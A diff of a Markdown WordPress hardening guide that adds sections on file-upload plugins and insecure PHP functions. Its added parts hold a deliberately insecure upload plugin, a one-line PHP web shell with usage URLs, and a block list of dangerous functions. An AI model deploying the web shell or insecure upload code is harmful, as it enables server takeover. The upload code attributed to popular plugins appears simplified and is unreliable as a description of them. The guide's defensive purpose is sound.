@@ -9,12 +9,28 @@ For websites where users register (sign up) and freely use the site, such as ope
 It does not encompass all the content necessary for securing WordPress. However, it is written to a level where it includes general but detailed information, allowing for security risk assessments and vulnerability responses based on the guide.
 ***
 
-==== In Progress as of May 30, 2024. ====
+## Table of Contents
+- [1. Ensure that the Default WordPress Admin Username has been Changed](#1-ensure-that-the-default-wordpress-admin-username-has-been-changed)
+- [2. Ensure User Roles and Permissions in WordPress are Properly Managed](#2-ensure-user-roles-and-permissions-in-wordpress-are-properly-managed)
+- [3. Ensure User Registration is Disabled](#3-ensure-user-registration-is-disabled)
+- [4. Ensure the Plugin File Editor is Disabled](#4-ensure-the-plugin-file-editor-is-disabled)
+- [5. Ensure Unused, Unnecessary Plugins are Deactivated](#5-ensure-unused-unnecessary-plugins-are-deactivated)
+- [6. Ensure WordPress is Configured to Use HTTPS Only, Including the WordPress Admin](#6-ensure-wordpress-is-configured-to-use-https-only-including-the-wordpress-admin)
+- [7. Ensure IP Access Restrictions (ACL) are Applied](#7-ensure-ip-access-restrictions-acl-are-applied)
+  * [7.1. Ensure that IP access restrictions are applied to the WordPress admin.](#71-ensure-that-ip-access-restrictions-are-applied-to-the-wordpress-admin)
+  * [7.2. Restrict IP Access or Disable JSON REST API Feature](#72-restrict-ip-access-or-disable-json-rest-api-feature)
+  * [7.3. Disable XML-RPC API Feature](#73-disable-xml-rpc-api-feature)
+  * [7.4. Disable WP-Cron or Restrict Feature](#74-disable-wp-cron-or-restrict-feature)
+- [8. System Configuration for Secure WordPress.](#8-system-configuration-for-secure-wordpress)
+  * [8.1. Ensure Use of Non-End-of-Life (EOL) WordPress and PHP Versions](#81-ensure-use-of-non-end-of-life-eol-wordpress-and-php-versions)
+  * [8.2. Ensure Only Necessary PHP Extensions for WordPress Are Enabled](#82-ensure-only-necessary-php-extensions-for-wordpress-are-enabled)
+  * [8.3. Ensure Security of Plugins with File Upload Features](#83-ensure-security-of-plugins-with-file-upload-features)
+  * [8.4. Ensure Insecure PHP Functions are Disabled](#84-ensure-insecure-php-functions-are-disabled)
 
-If you find this helpful, please the **"star"**:star2: to support further improvements.
+==== In Progress as of May 31, 2024. will be done June, 7 ====
+***
 
-## 1. Ensure that the Default WordPress Admin Username Has Been Changed
-
+## 1. Ensure that the Default WordPress Admin Username has been Changed
 When you install WordPress, the default admin username is "admin" unless you change it during the setup process. 
 The "admin" account name is widely known, so it should be changed to a different name.
 If you continue to use "admin" as your admin username, an attacker could attempt a brute-force attack using "admin" to gain access to your WordPress site.
@@ -41,7 +57,8 @@ that your new password is strong enough).
    - When all set, click "Confirm Deletion".
 
 **Note:**
-Always use different "display name" from the username. If the actual username is used as display name of the content author, a hacker will easily identify username and target the account
+- Always use different "display name" from the username. 
+If the actual username is used as display name of the content author, a hacker will easily identify username and target the account
 
 
 ## 2. Ensure User Roles and Permissions in WordPress are Properly Managed
@@ -68,13 +85,15 @@ If user roles and permissions are not properly managed, users might gain unneces
 | 4  | Contributor    | Can write content but cannot publish it. Posts are reviewed and published by an administrator. | Internal Content Contributors                               |
 | 5  | Subscriber     | Can log in to the site and manage their personal profile, but cannot write or edit content.    | Internal Content Contributors                               |
 
-**Note:** For service-oriented websites such as company blogs, recruitment pages, brand sites, and promotional sites where users interact minimally and content is primarily showcased, roles such as "Administrators", "Editors", and "Authors" are typically sufficient.
+**Note:**
+- In most cases, for service-oriented websites such as company blogs, recruitment pages, brand sites, and promotional sites 
+where users interact minimally and content is primarily showcased, roles such as "Administrators", "Editors", and "Authors" are sufficient.
 
 
 ## 3. Ensure User Registration is Disabled
 WordPress includes a built-in user registration feature. This feature is disabled by default, but it can be activated by an administrator.
 
-If this feature is enabled, anyone can register and potentially access the WordPress Admin dashboard, which can lead to security issues.
+If this feature is enabled, anyone can register and potentially access the WordPress admin dashboard, which can lead to security issues.
 For most websites that are not intended to operate as open communities, the user registration feature is unnecessary and should remain disabled.
 
 **Audit:**
@@ -83,7 +102,7 @@ For most websites that are not intended to operate as open communities, the user
 1. Using a web browser
    - Go to https://yourwordpress.com/wp-login.php?action=register
    - If user registration is disabled, you will see "User registration is currently not allowed."
-    ![3.1!](/images/3.1.png)
+    ![3.1!](images/3.1.png)
 
 2. Using curl
    - If user registration is disabled, it will redirect to the disabled page.
@@ -104,10 +123,10 @@ location: https://yourwordpress.com/wp-login.php?registration=disabled
 **Remediation:**
 - If user registration is enabled, disable it.
 - Uncheck “Anyone can register”
-![3.2!](/images/3.2.png)
+![3.2!](images/3.2.png)
 
 
-## 4. Ensure File Editor is Disabled
+## 4. Ensure the Plugin File Editor is Disabled
 If an attacker breaks into a WordPress Administrator account, they can take full control of your website. 
 They can edit the coding of your theme and plugins through the built-in "Editor" feature, upload malicious scripts, deface your site, spam your users, and more.
 
@@ -134,28 +153,23 @@ define('DISALLOW_FILE_EDIT', true);
 6. Save the changes and close the editor.
 7. Return to your WordPress dashboard and confirm that the editor options are no longer available.
 
-**Note:** 
-If you do not have access to cPanel, you can download your wp-config.php file via FTP, edit it in a text editor to include the above line of code, and then upload it back to your website, overwriting the old file.
 
-Alternatively, use a security plugin like MalCare that includes a "Disable File Editor" feature to simplify this process.
-
-
-## 5. Ensure Unused, Unnecessary Plugins are Disabled
+## 5. Ensure Unused, Unnecessary Plugins are Deactivated
 Many vulnerabilities in WordPress stem from plugin security issues. 
-Plugins are often open-source, making it easier for attackers to find and exploit vulnerabilities. 
-It is crucial to keep the plugins you use up-to-date and deactivate any unused plugins to prevent them from being exploited.
+Plugins are open-sourced, making it easier for attackers to find and exploit vulnerabilities. 
+It is crucial to keep the plugins you use up-to-date and to deactivate any unused plugins to prevent potential exploitation.
 
 **Audit:**
-- Check that unused plugins are disabled.
-- Use the Plugin Check (PCP) to examine the code quality and security status of your plugins. This helps identify any "suspicious" plugins.
+- Check that unused, unnecessary plugins are deactivated. 
+- Verify that unused and unnecessary plugins are deactivated.
 
 **Remediation:**
-- Disabled any unused, unnecessary plugins by following these steps:
+- Deactivate any unused, unnecessary plugins by following these steps:
 
 **Use Plugin Check - PCP:**
 - PCP: https://wordpress.org/plugins/plugin-check
 1. Install and Activate Plugin Check (PCP):
-   - Go to your WordPress admin dashboard(/wp-admin)
+   - Go to your WordPress admin dashboard
    - Navigate to Plugins > Add New.
    - Search for "Plugin Check" and install, activate it.
 
@@ -186,14 +200,14 @@ It is crucial to keep the plugins you use up-to-date and deactivate any unused p
 2. Regular Updates
    - Keep plugins up-to-date to ensure you have the latest security patches.
 
-3. Disabled and Delete Unused Plugins
+3. Deactivate and Delete Unused Plugins
    - Even inactive plugins can pose a security risk, so remove them if they are not used.
    - Minimize Plugins: Use only the essential plugins
 
 
-## 6. Ensure WordPress, Including WordPress admin(/wp-admin), is Configured to Use HTTPS Only
-Most modern websites are configured to operate over SSL (HTTPS).
-However, sometimes web servers are mistakenly set up to handle both HTTP and HTTPS connections.
+## 6. Ensure WordPress is Configured to Use HTTPS Only, Including the WordPress Admin
+Today, most websites are configured to operate over SSL (HTTPS).
+However, some web servers may still be mistakenly set up to handle both HTTP and HTTPS connections.
 This can allow access to WordPress via both protocols, which is a security risk. WordPress, including WordPress Admin, should be forced to use HTTPS exclusively.
 
 **Audit:**
@@ -215,7 +229,7 @@ This can allow access to WordPress via both protocols, which is a security risk.
 `
 5. Above this line, add the following code:
 `
-define('FORCE_SSL_ADMIN', true);
+define('FORCE_SSL_ADMIN', true);`
 `
 6. Save the changes and close the editor.
 Return to your WordPress dashboard and log in again to ensure WordPress Admin is accessible only via HTTPS.
@@ -244,13 +258,12 @@ Return to your WordPress dashboard and log in again to ensure WordPress Admin is
     ```
 By ensuring that WordPress and WordPress Admin are accessible only via HTTPS, you can significantly enhance the security of your website, protecting data and preventing unauthorized access.   
 
-
 ## 7. Ensure IP Access Restrictions (ACL) are Applied
-Verify that IP access restrictions are in place.
+Verify that IP access restrictions are applied
 
 To securely operate WordPress, it's essential to apply IP access restrictions to certain URLs, including WordPress Admin, to prevent unwanted users, computers, and bots from accessing them. This involves allowing access only from permitted IP addresses, such as administrator IPs. Additionally, disabling unused features is necessary to minimize attack surfaces.
 
-The URLs to secure include WordPress Admin user registration, JSON REST API, and the XML-RPC feature.
+The URLs to secure include WordPress Admin, user registration (wp-signup.php), JSON REST API, and the XML-RPC feature.
 
 This security guide targets service-oriented websites like company blogs, recruitment pages, brand sites, and promotional sites where user interaction is minimal and content is primarily showcased.
 
@@ -262,8 +275,8 @@ WordPress admin access path is fixed in the form of wp-login.php or /wp-admin, m
 Ensure that ip access restriction is applied to prevent unauthorized access to the admin page.
 
 **Audit:**
-- Verify that IP access restrictions are in place for WordPress admin.
-- Typically, this is configured on the web server (Apache, Nginx).
+- Verify that IP access restrictions are applied for WordPress admin.
+- In most cases, this is configured on the web server (Apache, Nginx).
 
 **Remediation:**
 - If IP access restrictions are not applied, implement them.
@@ -324,7 +337,7 @@ For most WordPress, the REST API feature is not essential.
 Enabling it may expose WordPress to DDoS attacks and could result in resource consumption and site slowdowns.
 
 **Audit:**
-- Verify if the JSON REST API feature is enabled. (Default: Enabled)
+- Verify that JSON REST API feature is enabled. (Default: Enabled)
 ```
 # curl -i -k https://yourwordpress.com/wp-json
 
@@ -343,7 +356,7 @@ Server: Apache
 - If using the REST API, apply IP access restrictions to allow access only from permitted IPs.
 
 **Install "Disable REST API" Plugin, Activate:**
-1. Go to your WordPress admin dashboard(/wp-admin)
+1. Go to your WordPress admin dashboard
 2. Navigate to Plugins > Add New. 
 3. Search for "[Disable REST API](https://wordpress.org/plugins/disable-json-api/)" and install, activate it. 
 4. Once activated, the plugin should automatically disable the REST API functionality on your WordPress site.
@@ -362,6 +375,7 @@ Server: Apache
         deny all;
     }
     ```
+
 
 ### 7.3. Disable XML-RPC API Feature
 Similar to the JSON REST API, it's advisable to disable the XML-RPC API since it's not required for most WordPress installations.
@@ -411,7 +425,7 @@ XML-RPC server accepts POST requests only.
     ```
     # curl -i -k https://yourwordpress.com/xmlrpc.php
     
-    
+    (response)
     HTTP/1.1 405 Method Not Allowed
     Date: Mon, 25 Jun 2018 08:30:24 GMT
     Server: Apache
@@ -525,8 +539,8 @@ The issue arises when there is heavy page loading.
 As WP-Cron tasks are performed with each page load, multiple repeated accesses result in corresponding WP-Cron invocations. Consequently, system resources may become scarce, causing the site to slow down or even halt.
 This is a real occurrence and is frequently exploited in vulnerability attacks targeting WordPress.
 
-If WP-Cron is not needed, it is advisable to deactivate it.
-If necessary, restrict it to local hosts only.
+If WP-Cron is not necessary, it is advisable to deactivate it.
+If necessary, restrict access to local hosts only.
 
 
 **Audit:**
@@ -542,6 +556,7 @@ Allow: POST
 Content-Length: 42
 Content-Type: text/plain; charset=UTF-8
 ```
+
 **Remediation:**
 - Disable WP-Cron if not used.
 - If used, apply one of the following options appropriately:
@@ -630,7 +645,7 @@ define( 'ALTERNATE_WP_CRON', true );
         }
        ```
 
-**Example for using system cron (crontab):**
+**Example: Using System Cron (crontab):**
 - Before applying, disable WP-Cron first.
 ```
 # vim /etc/crontab
@@ -647,8 +662,8 @@ define( 'ALTERNATE_WP_CRON', true );
 **About Performing DoS attack using wp-cron.php:**
 - Send an extensive volume of requests to the wp-cron.php
 - This results in the script consuming an excessive amount of resources, eventually overloading the server
-![7.4.1!](/images/7.4.1.png)
-![7.4.2!](/images/7.4.2.png)
+![7.4.1!](images/7.4.1.png)
+![7.4.2!](images/7.4.2.png)
 
 
 ## 8. System Configuration for Secure WordPress.
@@ -670,13 +685,13 @@ Here’s what you need to do to verify and update your WordPress and PHP version
 - As of May 2024, the supported WordPress version is 6.5 and above. The supported PHP versions are 8.1, 8.2, and 8.3.
 - If you use a web hosting service, take advantage of their version-switching features to ensure you are running supported versions of both WordPress and PHP.
 
-**EOL Status as of May 2024:**
+**EOL Status as of May 2024**
  1. PHP: [supported-versions](https://www.php.net/supported-versions.php)
     - Currently Supported Versions: 8.1, 8.2, 8.3
  2. WordPress: [current-releases](https://wordpress.org/download/releases/)
     - Currently Supported Versions: 6.5 series
 
-**e.g., PHP in RockyLinux 8.5:**
+**Example: PHP in RockyLinux 8.5**
 - In RockyLinux 8.5, the default PHP versions available are 7.2, 7.3, and 7.4.
     ```
     # dnf module list php
@@ -702,8 +717,8 @@ Here’s what you need to do to verify and update your WordPress and PHP version
     Is this ok [y/N]: y
     Complete!
     ```
-- PHP 7 is end of life (EOL), you must use PHP 8.
-- PHP 8 can be installed from the REMI repository. 
+- PHP 7 has already reached end of life (EOL); upgrading to PHP 8 is recommended.
+- PHP 8 can be installed from the REMI repository.
 - Here is an example of how to enable and install PHP 8.2 using REMI:
     ```
     # Install PHP 8.2 in Rocky Linux 8
@@ -780,7 +795,7 @@ Here’s what you need to do to verify and update your WordPress and PHP version
     Zend Engine v4.2.0, Copyright (c) Zend Technologies
         with Zend OPcache v8.2.0, Copyright (c), by Zend Technologies
     ```
-**Note::**
+**Note:**
 - For detailed instructions on installing PHP from the REMI repository: [rpms.remirepo.net](https://rpms.remirepo.net/)
 - Documentation on WordPress and PHP compatibility: [php-compatibility-and-wordpress-versions](https://make.wordpress.org/core/handbook/references/php-compatibility-and-wordpress-versions/)
 
@@ -829,59 +844,342 @@ Essential extensions can be found here: [WordPress Hosting Handbook: PHP Extensi
 - Remove any unnecessary extensions. Sometimes, extensions are installed along with plugins, which may not be required for your site.
 - To check the currently enabled PHP extensions, you can review the **php.ini** file or use the **phpinfo()** function to list all active extensions.
 
-![8.2!](/images/8.2.png)
+![8.2!](images/8.2.png)
 
 - Certain extensions, if not needed, should be disabled to prevent potential security issues. 
-- e.g., Extensions like exif, fileinfo, imap, soap, pdo_sqlite, and opcache could be exploited if left enabled without proper use.
+- For example, Extensions like exif, fileinfo, imap, soap, pdo_sqlite, and opcache could be exploited if left enabled without proper use.
 - If you are using a web hosting service, many providers offer easy-to-use interfaces to switch PHP settings, including enabling or disabling PHP extensions. Using these features, you can manage extensions effectively.
 
-**e.g., Exploitation using Fileinfo extension**
 
-The **"fileinfo"** extension can be particularly dangerous if not properly secured. The **"fileinfo"** extension provides a way to check information about a file, such as its MIME type. However, if left enabled without proper controls, it can be exploited in several ways:
- 1. **Remote Code Execution**
-    - An attacker can exploit a vulnerability in the fileinfo extension to execute arbitrary code on the server. 
-    - This can happen if the extension is used to handle untrusted user input without proper validation.
+### 8.3. Ensure Security of Plugins with File Upload Features
+Plugins with file upload capabilities can be a significant security risk if not properly secured. Vulnerabilities in file upload functions can allow attackers to upload web shells, potentially leading to full system compromise. Therefore, it is crucial to ensure that any file upload functionality includes validation and sanitization mechanisms.
 
-    **Example Attack:**
-    - Suppose there is a vulnerability in the fileinfo extension that allows an attacker to craft a special file that, when analyzed by fileinfo, causes the server to execute malicious code. 
-    - This could lead to a complete compromise of the server.
-    ```php
-    // Example code that uses fileinfo without proper validation
+Why is this Important?
+1. Extension Validation:
+   - The server should validate file extensions against a whitelist of allowed types to prevent the upload of malicious files.
+
+2. MIME Type Checking:
+   - The MIME type of the file should be checked to ensure it matches the expected type, adding an additional layer of security.
+
+3. Upload Path Restrictions:
+   - Ensure there are no exposed paths that allow direct access to uploaded files without validation.
+
+File upload vulnerabilities are particularly dangerous because they provide a direct path for attackers to upload executable code and run arbitrary commands. File upload vulnerabilities are often easier to identify and exploit compared to other security flaws like SQL injection.
+
+**Audit:**
+- Identify plugins with file upload functionality on your WordPress site.
+- Verify that these plugins implement proper validation checks for uploaded files, including extension and MIME type validation.
+
+**Remediation:**
+- If a plugin with file upload functionality lacks proper validation, either enhance its security or remove the plugin.
+- Below are examples of popular WordPress plugins with file upload features and how they handle file validation.
+
+**Example: Popular WordPress Plugins with File Upload Handling**
+
+1. Contact Form 7
+   - Contact Form 7 is one of the most widely used form plugins in WordPress. It includes basic file upload functionality with extension and MIME type validation.
     
-    $finfo = finfo_open(FILEINFO_MIME_TYPE);
-    $mime = finfo_file($finfo, $_FILES['userfile']['tmp_name']);
-    finfo_close($finfo);
+     **Code for Allowed Extensions and MIME Type Check:**
+     ```
+      function wpcf7_allowed_file_extensions() {
+          // Default allowed file extensions
+          $allowed_file_extensions = array(
+              'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx',
+              'xls', 'xlsx', 'txt', 'csv', 'rtf', 'html', 'zip'
+          );
+          return $allowed_file_extensions;
+      }
     
-    if ($mime === 'application/x-php') {
-        include($_FILES['userfile']['tmp_name']); // Dangerous: allows execution of uploaded PHP files
-    }
+      function wpcf7_handle_upload( $file ) {
+          $allowed_mime_types = wpcf7_allowed_file_extensions();
+          $file_type = wp_check_filetype( $file['name'] );
+    
+          // Check if the file type is allowed
+          if ( ! in_array( $file_type['ext'], $allowed_mime_types ) ) {
+              return new WP_Error( 'wpcf7_upload_failed', __( 'File type is not allowed.', 'contact-form-7' ) );
+          }
+    
+          // Handle the file upload
+          $upload = wp_handle_upload( $file, array( 'test_form' => false ) );
+    
+          // Check if the upload was successful
+          if ( isset( $upload['error'] ) ) {
+              return new WP_Error( 'wpcf7_upload_failed', $upload['error'] );
+          }
+    
+          return $upload;
+      }
+      ```
+      In Contact Form 7, `the wpcf7_allowed_file_extensions()` function returns a list of allowed file extensions, 
+      and the `wpcf7_handle_upload()` function checks if the file extension is in this list before proceeding with the upload.
+
+2. WPForms
+   - WPForms handles file uploads by checking allowed file types.
+
+      **Example Code for WPForms:**
+       ```
+         function wpforms_get_file_types() {
+          // Return an array of allowed file types
+          return array( 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx' );
+      }
+    
+      function wpforms_process_file_upload( $file ) {
+          $allowed_file_types = wpforms_get_file_types();
+          $file_type = wp_check_filetype( $file['name'] );
+    
+          if ( ! in_array( $file_type['ext'], $allowed_file_types ) ) {
+              return new WP_Error( 'wpforms_upload_failed', __( 'File type is not allowed.', 'wpforms' ) );
+          }
+    
+          $upload = wp_handle_upload( $file, array( 'test_form' => false ) );
+    
+          if ( isset( $upload['error'] ) ) {
+              return new WP_Error( 'wpforms_upload_failed', $upload['error'] );
+          }
+    
+          return $upload;
+      }
+      ```
+
+3. WooCommerce
+   - WooCommerce also defines and checks for allowed file extensions directly in its upload handling code.
+   
+       **Example Code for WooCommerce:**
+        ```
+        function woocommerce_handle_upload( $file ) {
+            $allowed_file_types = array( 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx' );
+            $file_type = wp_check_filetype( $file['name'] );
+        
+            if ( ! in_array( $file_type['ext'], $allowed_file_types ) ) {
+                return new WP_Error( 'woocommerce_upload_failed', __( 'File type is not allowed.', 'woocommerce' ) );
+            }
+        
+            $upload = wp_handle_upload( $file, array( 'test_form' => false ) );
+        
+            if ( isset( $upload['error'] ) ) {
+                return new WP_Error( 'woocommerce_upload_failed', $upload['error'] );
+            }
+        
+            return $upload;
+        }
+        ```
+
+**Example: Malicious fileupload Plugin**
+- A malicious plugin might look pure but exploit the fileinfo extension to bypass security checks:
     ```
-
- 2. **Denial of Service (DoS)**
-    - An attacker can create files that cause  **"fileinfo"** to consume excessive amounts of CPU or memory, potentially leading to a denial of service. 
-    - This can be particularly effective against systems that process large numbers of files or user uploads.
-
-    **Example Attack:**
-    - By uploading a specially crafted file that causes  **"fileinfo"** to enter an infinite loop or consume excessive resources, an attacker can cause the server to become unresponsive.
-    ```php
-    // Example code that processes user-uploaded files with fileinfo
+    <?php
+    /*
+    Plugin Name: Simple Malicious Upload
+    Description: A plugin with hidden malicious file upload capability.
+    Version: 1.0
+    */
     
-    $finfo = finfo_open(FILEINFO_MIME_TYPE);
-    foreach ($_FILES['userfiles']['tmp_name'] as $file) {
-        $mime = finfo_file($finfo, $file);
-        // Process the file based on its MIME type
+    function simple_file_upload_menu() {
+        add_menu_page('File Upload', 'File Upload', 'manage_options', 'file-upload', 'simple_file_upload_page');
     }
-    finfo_close($finfo);
+    
+    add_action('admin_menu', 'simple_file_upload_menu');
+    
+    function simple_file_upload_page() {
+        ?>
+        <h1>File Upload</h1>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="uploaded_file" />
+            <input type="submit" name="upload_file" value="Upload" />
+        </form>
+        <?php
+    
+        if (isset($_POST['upload_file'])) {
+            simple_handle_file_upload();
+        }
+    }
+    
+    function simple_handle_file_upload() {
+        if (!empty($_FILES['uploaded_file']['tmp_name'])) {
+            $file_tmp = $_FILES['uploaded_file']['tmp_name'];
+            $file_name = basename($_FILES['uploaded_file']['name']);
+    
+            // Using fileinfo to check MIME type
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+            $mime_type = finfo_file($finfo, $file_tmp);
+            finfo_close($finfo);
+    
+            // Insecure handling: allows any PHP files to be uploaded
+            if ($mime_type === 'text/plain' || $mime_type === 'application/x-php') {
+                $upload_dir = wp_upload_dir();
+                $upload_file = $upload_dir['path'] . '/' . $file_name;
+    
+                // Move the uploaded file to the uploads directory
+                if (move_uploaded_file($file_tmp, $upload_file)) {
+                    echo "File uploaded successfully.";
+                } else {
+                    echo "File upload failed.";
+                }
+            } else {
+                echo "Invalid file type.";
+            }
+        }
+    }
+    ?>
     ```
+**Explanation of the Exploit:**
+- The malicious plugin allows PHP files to be uploaded if their MIME type is `application/x-php.`
+- An attacker can upload a PHP web shell using this functionality.
+- Once uploaded, the attacker access the file's URL and execute arbitrary commands.
 
-Disabling the **"fileinfo"** extension or ensuring that it is used only with trusted input can mitigate these risks. If your WordPress site does not need fileinfo, you should consider disabling it in your PHP configuration:
-```ini
-; Disable the fileinfo extension
-;extension=fileinfo.so
+**Example: PHP Web Shell Code**
+```
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
 ```
 
-The example above is meant to explain how the fileinfo PHP extension can be misused; 
-it does not imply that the fileinfo extension inherently has security issues. 
+**Demonstration of the Attack**
+1. Upload the Web Shell:
+   - The attacker uploads webshell.php through the plugin's upload form.
+2. Access and Use the Web Shell:
+   - The attacker accesses the web shell at `http://yourwordpress.com/wp-content/uploads/webshell.php`.
+   - By navigating to `http://yourwordpress.com/wp-content/uploads/webshell.php?cmd=ls`, the attacker can execute arbitrary commands.
 
-By disabling unnecessary PHP extensions as described, you can protect your WordPress site from common exploits and enhance overall security.
+**Note:**
+- The example is meant to explain how the plugin with file upload features can be misused.
+- Ensuring proper validation and sanitization can prevent potential exploitation and maintain the security of your WordPress site.
+- The above plugin codes are for educational purposes only.
+
+
+### 8.4. Ensure Insecure PHP Functions are Disabled
+Ensuring that certain PHP functions and settings are properly configured can significantly enhance the security of your WordPress site. 
+Misconfigured settings can expose your site to various vulnerabilities, including remote code execution, information disclosure, and session hijacking. 
+It is crucial to harden PHP by disabling or properly configuring these functions.
+
+Why is this Important?
+1. Remote Code Execution:
+   - Settings like `allow_url_fopen` and functions like exec can enable remote code execution, leading to potential system compromise.
+
+2. Information Disclosure:
+   - Options like `display_errors` and `expose_php` can leak sensitive information about your server setup, making it easier for attackers to find vulnerabilities.
+
+3. Session Security: 
+   - Proper session management settings, such as `session.cookie_secure` and `session.cookie_httponly`, protect session cookies from being accessed through client-side scripts or being transmitted over insecure channels.
+
+**Audit:**
+- Verify that the insecure PHP functions and settings listed below are appropriately configured and hardened.
+
+**Remediation:**
+- Review the following PHP settings and functions, and adjust them to ensure both the secure operation of your WordPress site and its functionality.
+
+1. allow_url_fopen:
+      - Allows functions to open and read files via URLs. 
+      - When enabled, functions like `file_get_contents(), fopen(), include(), and require()` can use retrieve data from remote locations over FTP or HTTP.
+      - WordPress and many WordPress plugins might require `allow_url_fopen` for various features. 
+      - However, it is not necessary to keep this setting enabled at all times. 
+      - It is better to enable it only when needed for security reasons.
+        ```
+        ; (Optional) Disable allow_url_fopen, if not unnecessary
+     
+         allow_url_fopen = Off
+        ```
+
+2. display_errors: 
+   - Determines whether PHP errors should be printed to the screen as part of the output. 
+   - Displaying errors can reveal sensitive information about your server environment and application, which can be used by attackers to exploit vulnerabilities.
+        ```
+        ; Disable PHP errors not be displayed on your WordPress website
+     
+        display_errors = Off
+        ```
+
+3. expose_php:
+   - Controls whether PHP advertises its presence and version in HTTP headers. 
+   - Revealing this information can assist attackers in identifying vulnerable PHP versions.
+        ```
+        ; Prevent exposing PHP version in HTTP response headers
+     
+        expose_php = Off
+        session.cookie_secure
+        ```
+
+4. session.cookie_secure: 
+   - Ensures that session cookies are only transmitted over secure HTTPS connections, protecting them from being intercepted during transmission.
+        ```
+        ; Ensure session cookies are sent over HTTPS
+     
+        session.cookie_secure = On
+        session.cookie_httponly
+        ```
+
+5. session.cookie_httponly:
+   - Makes session cookies inaccessible to JavaScript, mitigating the risk of cross-site scripting (XSS) attacks.
+        ```
+        ; Make session cookies inaccessible to JavaScript
+     
+        session.cookie_httponly = On
+        ```
+
+6. open_basedir:
+   - Restricts PHP's ability to access files outside of specified directories. 
+   - This can prevent attackers from accessing sensitive files on the server.
+        ```
+        ; Restrict PHP file access to the specified directory
+        open_basedir = "/path/to/your/web/root"
+        ```
+   **Example:**
+   - If your web root is /var/www/html, set open_basedir as follows:
+       ```
+       open_basedir = "/var/www/html:/tmp"
+     
+       This configuration allows PHP to access files only within the /var/www/html directory and the temporary directory /tmp.
+       ```
+
+7. disable_functions:
+   - PHP functions that are commonly exploited in attacks. 
+   - Disabling these functions can mitigate the risk of various types of attacks, including command injection and remote code execution. 
+        ```
+        ; Disable potentially dangerous PHP functions
+     
+        disable_functions = "system, exec, shell_exec, passthru, mysql_list_dbs, ini_alter, dl, symlink, link, chgrp, leak, popen, apache_child_terminate, virtual, mb_send_mail"
+        ```
+    **Explanation of Disabled Functions:**
+    - **system, exec, shell_exec, passthru**: 
+       - Allow the execution of system commands, which can be exploited for command injection attacks.
+    
+    - **mysql_list_dbs**: 
+       - Retrieves a list of databases from a MySQL server, which can be used to gather information for further attacks.
+    
+    - **ini_alter**: 
+        - Changes the configuration of PHP at runtime, potentially altering the security settings.
+    
+    - **dl**:
+        - Dynamically loads a PHP extension, which can be used to introduce malicious code.
+    
+    - **symlink, link**:
+        - Create symbolic or hard links, which can be exploited to manipulate files and directories inappropriately.
+    
+    - **chgrp**: 
+        - Changes the group ownership of a file, potentially altering access permissions.
+    
+    - **leak**: 
+        - Used to test for memory leaks, but can be exploited to consume server resources.
+    
+    - **popen**:
+        - Opens a pipe to a process, which can be exploited for command execution.
+    
+    - **apache_child_terminate**: 
+        - Terminates an Apache process, potentially disrupting service.
+    
+    - **virtual**:
+        - Specific to Apache and can be used to include other URLs, posing a security risk.
+    
+    - **mb_send_mail**: 
+        - Sends an email, which can be exploited for spamming.
+
+**Example: Below is a List of Disabled PHP Functions in an Actual WordPress**
+```
+system, exec, shell_exec, passthru, mysql_list_dbs, ini_alter, dl, symlink, 
+link, chgrp, leak, popen, apache_child_terminate, virtual, mb_send_mail
+```
 
